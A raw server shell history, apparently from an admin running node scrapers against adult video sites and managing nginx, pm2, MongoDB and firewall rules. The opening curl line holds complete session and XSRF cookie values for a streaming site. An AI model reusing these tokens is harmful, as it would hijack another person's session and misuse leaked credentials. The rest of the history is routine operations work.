curl 'https://ninjastream.to/watch/76RbAxrBjZEvV'   -H 'authority: ninjastream.to'   -H 'pragma: no-cache'   -H 'cache-control: no-cache'   -H 'upgrade-insecure-requests: 1'   -H 'user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'sec-fetch-site: none'   -H 'sec-fetch-mode: navigate'   -H 'sec-fetch-user: ?1'   -H 'sec-fetch-dest: document'   -H 'accept-language: en-US,en;q=0.9,vi;q=0.8,und;q=0.7'   -H 'cookie: __ddg1=XqQO73Uwj9xiJG5byFhz; _ga=GA1.2.174479707.1602072318; __ddg2=VzhGxRbt4U61B5zM; _gid=GA1.2.1470159470.1603455835; limit=50; XSRF-TOKEN=eyJpdiI6IjRXaXl6ZlBvZUpibEVsREN0MFZERXc9PSIsInZhbHVlIjoiTEpMbjR4VTY3MllCb0xOdmpIb28rdmtORTN3TEh5emJNVU5PdnFUTlh3N1pYTkt4ajNvd29QalhxTFQvRWRtQ2JvaVptT2pHZTIrU092QkQ4SlNQSGkxay9jZlpxVjRGVjhVejQrV1NvWmlRck1QU2NEaUE4MEpldHNMUk1RRG8iLCJtYWMiOiIwNDkyOTFlNzI1Y2FjMzE2N2E1NDJmMTFjNDBmOGQ3ZjNiYzkxZDQ2OGIzZWIwN2JmZTMxMDE3ODE5NmI0MWRkIn0%3D; ninjastream_session=eyJpdiI6IjNtRDhwRVl6dVZLRkc4VnVoQ21UWFE9PSIsInZhbHVlIjoiRzJjM0pkaG1FcDhIRkw3RzBiQVJ5VkxoUDE2Unk4T2dFRjMwa0wrVnBIWHlxZGQ4b282Y3pvWTZ1UWRnZUQzSlR5azVrQ21SUDVEMXN5V1V0TFFNWEdkUWUvUUk1ZXFIME1LL0M4QnE1bHJtNklNSmcybWtIRERYY3BYdlRVVnAiLCJtYWMiOiJkNDlmMmUyZDE3MTA1MjFhY2I5OTY2MjM3M2M5Nzk3YjdmY2EyZDY5MjM5YTdlNzBkMjA5Mzk5YTdjYmYxNDYxIn0%3D'   --compressed
tail /var/log/log 
cd /home/thumb
node dist/test5.js 16615 2000 > /var/log/log 2>&1 &
tail /var/log/log 
cd /home/thumb
node dist/test5.js 17072 2000 > /var/log/log 2>&1 &
cd /home/thumb
npm run start
node dist/testp.js 333 -333 > /dev/null 2>&1 &
tail /var/log/log 
tail /var/log/log -n 50
cd /home/thumb
node dist/testp.js 310 -310 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
tail /var/log/log -n 50
node dist/test5.js 17072 2000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
mongo
cd /home/thumb
tail /var/log/log -n 50
node dist/testp2.js 333 -333 > /var/log/log 2>&1 &
tail /var/log/log -n 50
ps aux
node dist/testp2.js 332 -332 > /var/log/log 2>&1 &
tail /var/log/log -n 50
tail /var/log/nginx/error.log
tail /var/log/nginx/error.log -n 50
tail /var/log/log -n 50
tail /var/log/nginx/error.log -n 50
tail /var/log/log -n 50
node dist/test5.js 17078 2000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
ps aux|grep redis
tail /var/log/log -n 50
tail /var/log/log 
curl 127.0.0.1:31000
top
cd /home/thumb
node dist/test5.js 19078 10000 > /var/log/log 2>&1 &
tail /var/log/log 
firewall-cmd --list-all
service nginx status
firewall-cmd --list-all
npm run start
npm i
npm run start
mongo
npm run start
npm run build
node dist/main.js
npm run build
node dist/main.js
pm2
pm2 -h
pm2 start dist/main.js -i 0 -l /dev/null -e /dev/null -o /dev/null
top
service mongod restart
top
tail /var/log/log 
top
npm run build
pm2 monit
pm2 restart main
npm run build
pm2 restart main
npm run build
pm2 restart main
tail /var/log/log 
cd /home/thumb
tail /var/log/log 
node dist/test5.js 20437 8000 > /var/log/log 2>&1 &
tail /var/log/log 
npm run build
pm2 restart main
top
npm run build
pm2 restart main
top
tail /var/log/log 
cd /home/thumb
node dist/test5.js 20666 8000 > /var/log/log 2>&1 &
tail /var/log/log 
npm run build
pm2 restart main
top
cd /home/thumb
npm run build
pm2 restart main
tail /var/log/log 
cd /home/thumb
node dist/test5.js 21373 7000 > /var/log/log 2>&1 &
top
cd /home/thumb
tail /var/log/log 
tail /var/log/log -n 50
node dist/test5.js 21594 7000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
nginx -t
service nginx restart
nginx -t
service nginx restart
nginx -t
service nginx restart
nginx -t
service nginx restart
top
tail /var/log/log 
cd /home/thumb
node dist/test5.js 21926 7000 > /var/log/log 2>&1 &
tail /var/log/nginx/error.log
pm2 monit
tail /var/log/nginx/error.log
curl "http://127.0.0.1:31000/pornstars/luna-love"
nginx -t
service nginx restart
nginx -t
service nginx restart
tail /var/log/nginx/error.log
nginx -t
service nginx restart
tail /var/log/nginx/error.log
top
nginx -t
service nginx restart
tail /var/log/nginx/error.log
nginx -t
service nginx restart
tail /var/log/nginx/error.log
tail /var/log/log 
npm run build
tail /var/log/log -n 50
node dist/test5.js 22127 7000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
node dist/test5.js 22127 7000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
npm run build
npm restart main
pm2 restart main
pm2 monit
pm2 restart main
npm run build
pm2 restart main
cd /home/thumb
npm run build
pm2 restart main
tail /var/log/log -n 50
node dist/test5.js 22138 7000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
npm run build
pm2 restart main
tail /var/log/log -n 50
cd /home/thumb
node dist/test5.js 22675 6000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
node dist/test5.js 23909 5000 > /var/log/log 2>&1 &
cd /home/thumb
tail /var/log/log -n 50
node dist/test5.js 23910 5000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
node dist/test5.js 23932 5000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
node dist/test5.js 24020 5000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
node dist/test5.js 24928 5000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
tail /var/log/log -n 50
node dist/test5.js 25049 5000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
node dist/test5.js 25049 5000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
cd /home/thumb
node dist/test5.js 25057 5000 > /var/log/log 2>&1 &
tail /var/log/log -n 50
ps aux|grep test5
ps aux|grep test5|wc -l
top
ps aux|grep test5|wc -l
tail /var/log/log -n 50
tail /var/log/log -n 2|grep page
tail /var/log/log -n 2|grep page|gawk '{ print $2 }'
tail /var/log/log -n 2|grep 'page:'|gawk '{ print $2 }'
x=`tail /var/log/log -n 2|grep 'page:'`;
echo $x;
x=`echo $x|gawk '{ print $2 }'`;
echo $x;
ps aux|grep test5|wc -l
x=`tail /var/log/log -n 2|grep 'page:'`;
x=`echo $x|gawk '{ print $2 }'`;
echo $x > /var/log/log2;
echo `expr $x + 1`;
tail /var/log/log -n 50
top
df -h
tail /var/log/log -n 50
crontab -e
tail /var/log/log -n 50
vi /etc/hosts
vi /etc/mongod.conf
vi /etc/hosts
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="148.251.83.50" port protocol="tcp" port="27017" accept'
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="148.251.83.50" port protocol="udp" port="27017" accept'
sudo firewall-cmd --reload
mongoexport --collection=pornstar --db=test --out=pornstar.json
ls
mongoexport --collection=video --db=test --out=video.json
ls
du -hs *
scp --help
mongoexport --collection=pornstar --db=test --out=pornstar.bson
mongoexport --collection=video --db=test --out=video.bson
service mongod restart
mongo
